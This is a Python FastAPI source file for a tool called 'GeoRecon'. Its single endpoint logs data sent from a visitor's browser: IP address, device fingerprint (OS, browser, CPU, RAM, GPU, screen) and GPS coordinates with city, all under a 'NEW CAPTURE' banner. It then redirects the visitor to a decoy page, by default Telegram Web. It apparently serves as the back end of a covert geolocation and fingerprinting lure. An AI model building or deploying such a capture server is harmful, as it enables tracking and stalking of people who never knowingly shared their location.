import logging
from datetime import datetime
from fastapi import APIRouter, Request

logger = logging.getLogger('GeoRecon')
router = APIRouter()


@router.post("/print")
async def capture_data(request: Request, data: dict):
    data["ip"] = request.client.host
    data["time"] = datetime.now().strftime("%H:%M:%S")

    # Красивый заголовок
    logger.info(f"\n{'─' * 50}")
    logger.info(f"📍 NEW CAPTURE | {data.get('time')} | IP: {data.get('ip')}")
    logger.info(f"{'─' * 50}")

    # Device Info
    logger.info(f"📱 Device Info:")
    logger.info(f"   OS: {data.get('OS')}")
    logger.info(f"   Browser: {data.get('Browser')}")
    logger.info(f"   Platform: {data.get('Platform')}")
    logger.info(f"   Cores: {data.get('Cores')} | RAM: {data.get('RAM')} GB")
    logger.info(f"   GPU: {data.get('Vendor')} / {data.get('Renderer')}")
    logger.info(f"   Screen: {data.get('Width')}x{data.get('Height')}")

    # Location Info
    if data.get('Type') == 'location':
        logger.info(f"\n📍 Location:")
        logger.info(f"   Status: {data.get('Status')}")
        logger.info(f"   Latitude: {data.get('Latitude')}")
        logger.info(f"   Longitude: {data.get('Longitude')}")
        logger.info(f"   Accuracy: {data.get('Accuracy')}")
        if data.get('City'):
            logger.info(f"   City: {data.get('City')}, {data.get('Country')}")

    elif data.get('Type') == 'error':
        logger.warning(f"\n❌ Location Error: {data.get('Error')}")

    logger.info(f"{'─' * 50}\n")

    context = getattr(request.app.state, "context", {})
    redirect_url = context.get("redirect_url", "https://web.telegram.org")

    return {"status": "ok", "redirect": redirect_url}